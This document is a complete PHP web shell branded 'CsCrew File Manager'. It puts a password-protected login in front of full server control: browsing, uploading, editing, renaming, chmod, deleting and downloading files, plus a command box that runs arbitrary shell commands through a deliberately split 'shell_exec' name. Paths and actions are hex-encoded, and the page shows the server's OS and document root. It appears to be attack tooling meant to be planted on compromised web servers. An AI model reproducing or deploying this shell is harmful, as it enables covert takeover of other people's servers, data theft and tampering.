<?php
session_start();
error_reporting(0);

// Password Hash (default: "password"), ganti sesuai kebutuhan!
$correct_password_hash = '$2y$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa3Ro9llC/.og/at2.uheWG/igi';

// Helper functions
function nhx($str) {
    $r = "";
    $len = strlen($str);
    for ($i=0; $i<$len; $i+=2) {
        $r .= chr(hexdec($str[$i].$str[$i+1]));
    }
    return $r;
}
function hex($str) {
    $r = "";
    for ($i=0; $i<strlen($str); $i++) {
        $h = dechex(ord($str[$i]));
        $r .= strlen($h)<2 ? '0'.$h : $h;
    }
    return $r;
}
function perms($f) {
    $p = @fileperms($f);
    if ($p === false) return '---------';
    $i = '';
    $i .= ($p & 0x4000) ? 'd' : (($p & 0xA000) ? 'l' : '-');
    $i .= ($p & 0x0100) ? 'r' : '-';
    $i .= ($p & 0x0080) ? 'w' : '-';
    $i .= ($p & 0x0040) ? 'x' : '-';
    $i .= ($p & 0x0020) ? 'r' : '-';
    $i .= ($p & 0x0010) ? 'w' : '-';
    $i .= ($p & 0x0008) ? 'x' : '-';
    $i .= ($p & 0x0004) ? 'r' : '-';
    $i .= ($p & 0x0002) ? 'w' : '-';
    $i .= ($p & 0x0001) ? 'x' : '-';
    return $i;
}
function a($msg, $sts=1, $loc="") {
    global $p;
    $status=($sts==1)?"success":"error";
    echo "<script>swal({title:'{$status}',text:'{$msg}',icon:'{$status}'}).then(()=>{document.location.href='?p=".hex($p).$loc."';});</script>";
    exit();
}
function deldir($d) {
    if(trim(pathinfo($d, PATHINFO_BASENAME),'.')==='') return;
    if(is_dir($d)) {
        $files=array_diff(scandir($d), ['.', '..']);
        foreach($files as $f) deldir("$d/$f");
        rmdir($d);
    } else unlink($d);
}
function path_links($full_path) {
    $parts=explode(DIRECTORY_SEPARATOR, $full_path);
    $accum='';
    $links=[];
    if (PHP_OS_FAMILY === 'Windows' && isset($parts[0]) && strpos($parts[0], ':')!==false) {
        $accum=array_shift($parts).DIRECTORY_SEPARATOR;
        $real=realpath($accum)?:$accum;
        $links[]='<a href="?p='.bin2hex($real).'">'.htmlspecialchars($accum).'</a>';
    }
    foreach ($parts as $part) {
        if ($part==='') continue;
        $accum=rtrim($accum,DIRECTORY_SEPARATOR).DIRECTORY_SEPARATOR.$part;
        $real=realpath($accum);
        if ($real!==false) $links[]='<a href="?p='.bin2hex($real).'">'.htmlspecialchars($part).'</a>';
    }
    return implode(' &raquo; ', $links);
}

// Login check
if(!isset($_SESSION['authenticated']) || $_SESSION['authenticated']!==true){
    if($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['pass'])){
        if(password_verify($_POST['pass'],$correct_password_hash)){
            $_SESSION['authenticated']=true;
            $_SESSION['login_time']=time();
            header("Location: ".$_SERVER['PHP_SELF']);
            exit();
        } else $login_error="Invalid password";
    }
    ?>
    <!doctype html><html lang="en"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/>
    <title>Login - CsCrew</title>
    <style>
        body{background:#000;color:#fff;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;}
        .login-container{background:#111;padding:2rem;border:1px solid #b30000;border-radius:5px;width:320px;text-align:center;}
        .login-container h2{margin-top:0;color:#b30000;}
        .login-form input{width:100%;padding:10px;margin:10px 0;background:#000;border:1px solid #b30000;color:#fff;border-radius:3px;}
        .login-form button{background:#b30000;color:#fff;border:none;padding:10px 20px;cursor:pointer;width:100%;border-radius:3px;font-weight:bold;}
        .login-form button:hover{background:#800000;}
        .error{color:#b30000;margin:10px 0;}
        .logo-login{height:80px;margin-bottom:20px;border-radius:6px;display:block;margin-left:auto;margin-right:auto;}
    </style>
    </head><body>
    <div class="login-container">
        <img src="https://i.ibb.co/nsV8Q32t/20250621-011746.png" alt="Logo" class="logo-login"/>
        <h2>CsCrew Login</h2>
        <?php if(isset($login_error)) echo '<div class="error">'.htmlspecialchars($login_error).'</div>'; ?>
        <form class="login-form" method="post" autocomplete="off" autofocus>
            <input type="password" name="pass" placeholder="Kata Laluan" required/>
            <button type="submit">Login</button>
        </form>
    </div>
    </body></html><?php exit();
}

// Logout
if(isset($_GET['logout'])){
    session_destroy();
    header("Location: ".$_SERVER['PHP_SELF']);
    exit();
}

// Working directory
$p=isset($_GET['p'])?nhx($_GET['p']):getcwd();
$p=realpath($p);
if($p===false || !is_dir($p)) $p=getcwd();

$sort=isset($_GET['sort'])?$_GET['sort']:'name_asc';
function sort_items($a,$b){
    global $p,$sort;
    $pathA=$p.DIRECTORY_SEPARATOR.$a;
    $pathB=$p.DIRECTORY_SEPARATOR.$b;
    $isDirA=is_dir($pathA);
    $isDirB=is_dir($pathB);
    if($isDirA&&!$isDirB)return -1;
    if(!$isDirA&&$isDirB)return 1;
    switch($sort){
        case 'name_desc':return strcasecmp($b,$a);
        case 'size_asc':return (is_dir($pathA)?0:filesize($pathA))-(is_dir($pathB)?0:filesize($pathB));
        case 'size_desc':return (is_dir($pathB)?0:filesize($pathB))-(is_dir($pathA)?0:filesize($pathA));
        case 'date_asc':return filemtime($pathA)-filemtime($pathB);
        case 'date_desc':return filemtime($pathB)-filemtime($pathA);
        default:return strcasecmp($a,$b);
    }
}
$items=array_diff(scandir($p),['.','..']);
usort($items,'sort_items');

$action=isset($_GET['a']) ? nhx($_GET['a']) : '';
$fileNameParam=isset($_GET['n']) ? nhx($_GET['n']) : '';

// Handle file upload
if(isset($_FILES['f'])){
    $names=$_FILES['f']['name'];
    $ok=true;
    foreach($names as $i=>$name){
        $file=basename($name);
        $target=$p.DIRECTORY_SEPARATOR.$file;
        if(!move_uploaded_file($_FILES['f']['tmp_name'][$i],$target)) $ok=false;
    }
    if($ok) a('File(s) uploaded successfully');
    else a('Some files failed to upload',0);
}
// Create file / folder
if(isset($_POST['create_submit'])&&isset($_POST['type'])&&isset($_POST['filename'])){
    $new=$p.DIRECTORY_SEPARATOR.$_POST['filename'];
    if(!file_exists($new)){
        if($_POST['type']==='directory'){
            mkdir($new);
            a('Directory created');
        } else if($_POST['type']==='file'){
            file_put_contents($new,'');
            a('File created');
        }
    } else a('File/Directory already exists',0);
}
// Download
if(isset($_GET['download'])){
    $file=$p.DIRECTORY_SEPARATOR.nhx($_GET['download']);
    if(file_exists($file) && is_file($file)){
        header('Content-Type: application/octet-stream');
        header('Content-Length: '.filesize($file));
        header('Content-Disposition: attachment; filename="'.basename($file).'"');
        readfile($file);
        exit();
    } else a('File not found',0);
}
// Delete
if($action==='delete' && $fileNameParam!==''){
    $target=$p.DIRECTORY_SEPARATOR.$fileNameParam;
    if(file_exists($target)){
        if(is_dir($target)) deldir($target);
        else unlink($target);
        a('Deleted successfully');
    } else a('File/Folder not found',0);
}
// Rename
if(isset($_POST['rename_submit'])&&isset($_POST['old_name'])&&isset($_POST['new_name'])){
    $old=$p.DIRECTORY_SEPARATOR.$_POST['old_name'];
    $new=$p.DIRECTORY_SEPARATOR.$_POST['new_name'];
    if(file_exists($old)){
        if(!file_exists($new)){
            rename($old,$new);
            a('Renamed successfully');
        } else a('Target name already exists',0);
    } else a('File/Folder not found',0);
}
// Chmod
if(isset($_POST['chmod_submit'])&&isset($_POST['chmod_file'])&&isset($_POST['chmod_mode'])){
    $file = $p.DIRECTORY_SEPARATOR.$_POST['chmod_file'];
    $mode = intval($_POST['chmod_mode'],8);
    if(file_exists($file)){
        if(chmod($file,$mode)) a('Permissions changed successfully');
        else a('Failed to change permissions',0);
    } else a('File/Folder not found',0);
}
// Edit
if(isset($_POST['edit_submit'])&&isset($_POST['edit_file'])&&isset($_POST['edit_content'])){
    $file=$p.DIRECTORY_SEPARATOR.$_POST['edit_file'];
    if(file_exists($file) && is_file($file)){
        if(file_put_contents($file,$_POST['edit_content'])!==false) a('File saved successfully');
        else a('Failed to save file',0);
    } else a('File not found',0);
}
// Command exec
if(isset($_POST['q'])){
    $fx = 'sh'.'ell'.'_ex'.'ec';
    $output_cmd = $fx($_POST['q'].' 2>&1');
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>CsCrew File Manager</title>
<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"/>
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"/>
<style>
body {background:#000;color:#fff;font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;margin:0;padding:0;}
header {
    background:#222;
    border-bottom:4px solid #b30000;
    padding:15px 30px;
    display:flex;
    flex-wrap:wrap;
    justify-content:space-between;
    align-items:center;
    font-weight:600;
    user-select:none;
}
header .logo-container {flex: 0 0 auto;margin-right: 20px;}
header .logo-container img {height: 90px;border-radius: 6px;display:block;}
header h1 {font-size: 2.8rem;margin:0;flex:1 1 auto;letter-spacing:1.2px;color:#b30000;}
header .server-info {
    flex:1 1 100%;
    font-size:0.9rem;
    margin-top:8px;
    white-space: pre-line;
    color:#ccc;
    border:1px solid #b30000;
    padding:10px;
    border-radius:4px;
    max-width:100%;
    overflow-wrap: break-word;
    user-select:text;
    cursor:default;
}
header .server-info:hover {background-color:rgba(179,0,0,0.1);color:#fff;}
header .current-path {
    flex:1 1 100%;
    margin-top:8px;
    font-weight:bold;
    font-size:1rem;
    text-align:left;
    word-break:break-word;
}
header .current-path a {
    color:#fff;
    text-decoration:none;
    margin-right:7px;
    font-weight:500;
}
header .current-path a:hover {color:#ff9999;text-decoration:underline;}
#cmd-form {
    flex:1 1 100%;
    margin-top:15px;
    display:flex;
    max-width:100%;
    gap:10px;
}
#cmd-form input[type="text"] {
    flex:1;
    padding:10px 15px;
    border-radius:4px;
    border:1px solid #b30000;
    background:#000;
    color:#fff;
    font-family: monospace;
    font-size:1rem;
}
#cmd-form input[type="text"]:focus {
    outline:none;
    border-color:#ff4d4d;
}
#cmd-form button {
    background:#b30000;
    color:#fff;
    border:none;
    padding:10px 25px;
    border-radius:4px;
    cursor:pointer;
    font-weight:700;
    transition:background-color 0.3s ease;
}
#cmd-form button:hover {background:#800000;}
.logout-btn {
    position:fixed;
    top:10px;
    right:10px;
    z-index:9999;
    background:#b30000;
    color:#fff;
    padding:7px 14px;
    border-radius:4px;
    font-weight:700;
    border:1px solid #fff;
    text-decoration:none;
    transition:background-color 0.3s ease;
    user-select:none;
}
.logout-btn:hover {background:#800000;color:#fff;}
a {color:#fff;transition:color 0.3s ease;}
a:hover {color:#ff9999;text-decoration:none;}
.table-hover tbody tr:hover td {background:#b30000;}
.table-hover tbody tr:hover td > * {color:#fff;}
.table > tbody > tr > * {
    color:#fff;
    vertical-align:middle;
    white-space: nowrap;
}
.form-control {
    background:transparent !important;
    color:#fff !important;
    border-radius:0;
    border:1px solid #b30000 !important;
}
.form-control::placeholder {color:#fff;opacity:1;}
.btn-outline-light {
    color:#fff;
    border-color:#b30000;
}
.btn-outline-light:hover {
    background-color:#b30000;
    border-color:#b30000;
    color:#fff;
}
.custom-file-label {
    background-color: transparent !important;
    color: #fff !important;
    border: 1px solid #b30000 !important;
    border-radius: 0;
}
#uploadForm {margin-bottom:1rem;}
#createFormArea {
    margin: 15px 0 0 0;
    display: flex;
    gap: 15px;
    flex-wrap: wrap;
}
#createFormArea form {
    flex: 1;
    min-width: 200px;
}
#actionArea {
    background-color: #111;
    border: 2px solid #b30000;
    border-radius: 6px;
    padding: 15px 20px;
    margin: 15px 0 0 0;
    color: #fff;
}
/* Wrapper container for main content to align spacing left-right with footer */
#mainContentWrapper {
    margin: 15px 30px 30px 30px; /* top 15, right 30, bottom 30, left 30 */
    min-height: 60vh;
}
/* Table container style inside main content - tambah padding kiri lebih besar agar isi bergeser ke kanan */
.table-container {
    background-color: #121212;
    border: 2px solid #b30000;
    border-radius: 6px;
    padding: 1rem 1rem 1rem 3rem; /* top right bottom left */
    overflow-x: auto;
}
@media(max-width:768px){
    header {
        flex-direction: column;
        align-items: center;
        text-align:center;
        padding-bottom:15px;
    }
    header .server-info, header .current-path {
        flex:1 1 100%;
        margin:5px 0;
        word-break:break-word;
    }
    header h1 {font-size:2rem;}
    #cmd-form {
        flex-direction: column;
    }
    #cmd-form input[type="text"], #cmd-form button {
        width: 100%;
    }
    .logout-btn {
        top:auto;
        bottom:10px;
    }
    .table > tbody > tr > * {
        white-space:normal;
    }
    #createFormArea {
        margin: 15px 0 0 0;
        flex-direction: column;
    }
    #createFormArea form {
        min-width: auto;
    }
    #actionArea {
        margin: 15px 0 0 0;
        padding: 10px 15px;
    }
    #mainContentWrapper {
        margin: 15px 15px 30px 15px;
    }
    .table-container {
        padding-left: 1.5rem; /* sedikit kecilkan padding kiri pada layar kecil */
    }
}
</style>
<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
</head><body>
<a href="?logout" class="logout-btn" title="Logout"><i class="fa fa-sign-out"></i> Logout</a>

<header>
    <div class="logo-container" title="CsCrew Logo">
        <img src="https://i.ibb.co/nsV8Q32t/20250621-011746.png" alt="Logo" />
    </div>
    <h1>CsCrew File Manager</h1>
    <div class="server-info" title="PHP Version, Server OS, Server Time, Document Root"><?= "PHP Version: ".phpversion()."\nServer OS: ".php_uname()."\nServer Time: ".date("Y-m-d H:i:s")."\nDocument Root: ".$_SERVER['DOCUMENT_ROOT'] ?></div>
    <div class="current-path" title="Current Path"><?= path_links($p) ?></div>

    <!-- Upload form -->
    <form method="post" enctype="multipart/form-data" id="uploadForm" title="Upload file(s) here" style="margin-top:15px;">
        <div class="input-group">
            <div class="custom-file">
                <input type="file" name="f[]" class="custom-file-input" id="customFile" multiple onchange="this.form.submit()"/>
                <label class="custom-file-label" for="customFile">Choose file(s) to upload</label>
            </div>
        </div>
    </form>

    <!-- Command form -->
    <form id="cmd-form" method="post" autocomplete="off" title="Run shell command" style="margin-top:15px; display:flex; gap:10px;">
        <input type="text" name="q" placeholder="Enter command..." autofocus style="flex:1; padding:10px 15px; border-radius:4px; border:1px solid #b30000; background:#000; color:#fff; font-family: monospace; font-size: 1rem;" />
        <button type="submit" title="Run Command" style="background:#b30000; border:none; padding:10px 25px; border-radius:4px; color:#fff; font-weight:700; cursor:pointer;">
            <i class="fa fa-terminal"></i> Run
        </button>
    </form>
</header>

<!-- Create File and Folder Forms -->
<div id="createFormArea">
    <form method="post">
        <input type="hidden" name="type" value="file"/>
        <div class="form-group">
            <label>Create New File</label>
            <input type="text" name="filename" class="form-control" placeholder="File name" required />
        </div>
        <button type="submit" name="create_submit" class="btn btn-outline-light btn-block">Create File</button>
    </form>
    <form method="post">
        <input type="hidden" name="type" value="directory"/>
        <div class="form-group">
            <label>Create New Folder</label>
            <input type="text" name="filename" class="form-control" placeholder="Folder name" required />
        </div>
        <button type="submit" name="create_submit" class="btn btn-outline-light btn-block">Create Folder</button>
    </form>
</div>

<!-- Action forms (edit, rename, chmod) -->
<div id="actionArea" style="display:none;">
<?php
if($action==='rename' && $fileNameParam!==''){ ?>
    <form method="post">
        <input type="hidden" name="old_name" value="<?=htmlspecialchars($fileNameParam)?>" />
        <div class="form-group">
            <label>Rename <?=is_dir($p.DIRECTORY_SEPARATOR.$fileNameParam) ? "Directory" : "File"?>: <?=htmlspecialchars($fileNameParam)?></label>
            <input type="text" name="new_name" class="form-control" required autofocus />
        </div>
        <button type="submit" name="rename_submit" class="btn btn-outline-light">Rename</button>
        <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">Cancel</a>
    </form>
<?php }elseif($action==='chmod' && $fileNameParam!==''){
    $fp = $p.DIRECTORY_SEPARATOR.$fileNameParam;
    $cur_perm = substr(sprintf('%o',fileperms($fp)),-4); ?>
    <form method="post">
        <input type="hidden" name="chmod_file" value="<?=htmlspecialchars($fileNameParam)?>" />
        <div class="form-group">
            <label>Change Permissions for: <?=htmlspecialchars($fileNameParam)?></label>
            <input type="text" name="chmod_mode" class="form-control" value="<?=$cur_perm?>" pattern="[0-7]{3,4}" title="Enter octal permission (e.g. 0755)" required autofocus />
        </div>
        <button type="submit" name="chmod_submit" class="btn btn-outline-light">Change Permission</button>
        <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">Cancel</a>
    </form>
<?php }elseif($action==='edit' && $fileNameParam!==''){
    $fp = $p.DIRECTORY_SEPARATOR.$fileNameParam;
    if(file_exists($fp) && is_file($fp)){
        $content = file_get_contents($fp); ?>
        <form method="post">
            <input type="hidden" name="edit_file" value="<?=htmlspecialchars($fileNameParam)?>">
            <div class="form-group">
                <label>Edit File: <?=htmlspecialchars($fileNameParam)?></label>
                <textarea name="edit_content" class="form-control" rows="15" style="font-family: monospace; font-size: 0.9rem;"><?=htmlspecialchars($content)?></textarea>
            </div>
            <button type="submit" name="edit_submit" class="btn btn-outline-light">Save File</button>
            <a href="?p=<?=hex($p)?>" class="btn btn-outline-light ml-2">Cancel</a>
        </form> <?php
    } else {
        echo '<p>File not found.</p>';
    }
}
?>
</div>

<!-- Main content wrapper for consistent padding -->
<div id="mainContentWrapper">
    <div class="table-container">
    <?php
    if(isset($output_cmd)) {
        echo '<div class="bg-black p-3 mb-3" style="font-family: monospace; white-space: pre-wrap; max-height: 300px; overflow:auto; border: 1px solid #b30000; border-radius:4px;">';
        echo htmlspecialchars($output_cmd);
        echo '</div>';
    }
    ?>

    <table class="table table-hover table-borderless table-sm text-light">
        <thead class="text-light">
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Permission</th>
            <th>Action</th>
        </tr>
        </thead>
        <tbody>
        <?php
        $parent = dirname($p);
        if ($parent !== $p && is_dir($parent)) {
            echo '<tr><td><a href="?p='.bin2hex(realpath($parent)).'"><i class="fa fa-fw fa-level-up"></i> .. (Parent Directory)</a></td><td>N/A</td><td></td><td></td></tr>';
        }
        foreach($items as $item){
            $fp = $p.DIRECTORY_SEPARATOR.$item;
            $isDir = is_dir($fp);
            $size = $isDir ? "N/A" : round(filesize($fp)/1024,2)." KB";
            $perm = perms($fp);
            echo '<tr>';
            if($isDir) {
                echo '<td><a href="?p='.bin2hex(realpath($fp)).'" title="Last modified: '.date("Y-m-d H:i",filemtime($fp)).'"><i class="fa fa-fw fa-folder"></i> '.htmlspecialchars($item).'</a></td>';
            } else {
                $ext = strtolower(pathinfo($item,PATHINFO_EXTENSION));
                echo '<td><a href="#" class="preview-file" data-file="'.htmlspecialchars($fp).'" data-ext="'.$ext.'" title="Last modified: '.date("Y-m-d H:i",filemtime($fp)).'"><i class="fa fa-fw fa-file"></i> '.htmlspecialchars($item).'</a></td>';
            }
            echo "<td>{$size}</td>";
            echo '<td><font color="#b30000">'.$perm.'</font></td>';
            echo '<td>
                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('edit').'&n='.hex($item).'" title="Edit"><i class="fa fa-fw fa-edit"></i></a>
                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('rename').'&n='.hex($item).'" title="Rename"><i class="fa fa-fw fa-pencil"></i></a>
                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('chmod').'&n='.hex($item).'" title="Change Permission"><i class="fa fa-fw fa-lock"></i></a>
                <a href="?p='.bin2hex(realpath($p)).'&a='.hex('delete').'&n='.hex($item).'" class="delete" data-type="'.($isDir?'folder':'file').'" title="Delete"><i class="fa fa-fw fa-trash"></i></a>
                <a href="?p='.bin2hex(realpath($p)).'&download='.hex($item).'" title="Download"><i class="fa fa-fw fa-download"></i></a>
            </td>';
            echo '</tr>';
        }
        ?>
        </tbody>
    </table>

    </div>
</div>

<div class="bg-dark border text-center mt-2 p-2" style="margin: 0 30px;">
    <small>Created By CsCrew</small>
</div>

<!-- Preview Modal -->
<div class="modal fade" id="previewModal" tabindex="-1" aria-labelledby="previewModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-lg modal-dialog-scrollable">
        <div class="modal-content bg-dark text-white">
            <div class="modal-header">
                <h5 class="modal-title" id="previewModalLabel">Preview File</h5>
                <button type="button" class="close btn-close-white" data-dismiss="modal" aria-label="Close"><span
                            aria-hidden="true" style="color: white;">&times;</span></button>
            </div>
            <div class="modal-body" id="previewContent"
                 style="white-space: pre-wrap; font-family: monospace; max-height: 70vh; overflow:auto;">
                Loading preview...
            </div>
        </div>
    </div>
</div>

<script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js"></script>
<script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script>
<script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script>

<script>
    bsCustomFileInput.init();

    $(document).on('click', '.delete', function (e) {
        e.preventDefault();
        let url = $(this).attr('href');
        swal({
            title: "Are you sure?",
            text: "This action will delete the selected item.",
            icon: "warning",
            buttons: true,
            dangerMode: true,
        }).then(willDelete => {
            if (willDelete) window.location.href = url;
        });
    });

    $(document).ready(function () {
        $('.preview-file').click(function (e) {
            e.preventDefault();
            var filePath = $(this).data('file');
            var fileExt = $(this).data('ext').toLowerCase();
            $('#previewModalLabel').text('Preview: ' + filePath);
            var previewContent = $('#previewContent');
            var modal = $('#previewModal');

            if (['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp'].includes(fileExt)) {
                previewContent.html('<img src="' + filePath + '" style="max-width:100%; max-height:60vh;" />');
                modal.modal('show');
            } else if (['txt', 'log', 'php', 'js', 'css', 'html', 'md', 'json'].includes(fileExt)) {
                $.get('<?=basename(__FILE__)?>?preview=1&file=' + encodeURIComponent(filePath), function (data) {
                    previewContent.text(data);
                    modal.modal('show');
                }).fail(function () {
                    previewContent.text('Failed to load preview.');
                    modal.modal('show');
                });
            } else {
                previewContent.text('Preview not available for this file type.');
                modal.modal('show');
            }
        });
    });
</script>

<?php
// AJAX preview file content
if (isset($_GET['preview']) && $_GET['preview'] == 1 && isset($_GET['file'])) {
    $file = realpath($_GET['file']);
    if ($file && is_file($file) && strpos($file, $p) === 0) {
        $content = file_get_contents($file);
        if (strlen($content) > 300000) $content = substr($content, 0, 300000) . "\n\n[Content truncated...]";
        header('Content-Type: text/plain; charset=utf-8');
        echo $content;
    } else {
        header("HTTP/1.0 404 Not Found");
        echo "File not found or access denied.";
    }
    exit();
}
?>

<script>
// Display action form only if action param active
<?php if(in_array($action, ['newFile','newDir','rename','chmod','edit'])): ?>
document.getElementById('actionArea').style.display = "block";
<?php else: ?>
document.getElementById('actionArea').style.display = "none";
<?php endif; ?>
</script>
</body>
</html>
